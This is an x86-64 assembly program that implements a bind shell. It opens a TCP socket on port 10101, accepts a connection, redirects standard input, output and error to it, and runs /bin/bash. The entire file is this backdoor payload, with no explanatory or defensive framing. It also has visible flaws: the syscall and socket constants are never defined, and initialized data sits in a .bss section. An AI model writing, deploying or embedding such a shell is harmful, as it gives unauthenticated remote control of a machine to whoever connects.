.section .data
    sockfd:
        .long 0
    fd:
        .long 0
    bash:
        .asciz "/bin/bash"

.section .bss
    sin:
        .fill 8, 1, 0
        .word 0x7527
        .fill 8, 1, 0

.section .text
.globl _start
_start:
    # Create socket
    movq $SYS_SOCKET, %rax
    movq $AF_INET, %rdi
    movq $SOCK_STREAM, %rsi
    movq $IPPROTO_TCP, %rdx
    syscall
    movq %rax, sockfd(%rip)

    # Prepare sockaddr_in structure
    movw $AF_INET, sin(%rip)
    movw $10101, %ax
    xchg %ah, %al
    movw %ax, sin+2(%rip)

    # Bind
    movq $SYS_BIND, %rax
    movq sockfd(%rip), %rdi
    leaq sin(%rip), %rsi
    movq $16, %rdx
    syscall

    # Listen
    movq $SYS_LISTEN, %rax
    movq sockfd(%rip), %rdi
    movq $1, %rsi
    syscall

    # Accept
    movq $SYS_ACCEPT, %rax
    movq sockfd(%rip), %rdi
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    syscall
    movq %rax, fd(%rip)

    # Duplicate file descriptors
    movq $SYS_DUP2, %rax
    movq fd(%rip), %rdi
    xorq %rsi, %rsi
    movq $0, %rdx
    syscall

    movq $SYS_DUP2, %rax
    movq fd(%rip), %rdi
    movq $1, %rsi
    movq $0, %rdx
    syscall

    movq $SYS_DUP2, %rax
    movq fd(%rip), %rdi
    movq $2, %rsi
    movq $0, %rdx
    syscall

    # Execute /bin/bash
    movq $SYS_EXECVE, %rax
    leaq bash(%rip), %rdi
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    syscall

    # Exit
    movq $SYS_EXIT, %rax
    xorq %rdi, %rdi
    syscall
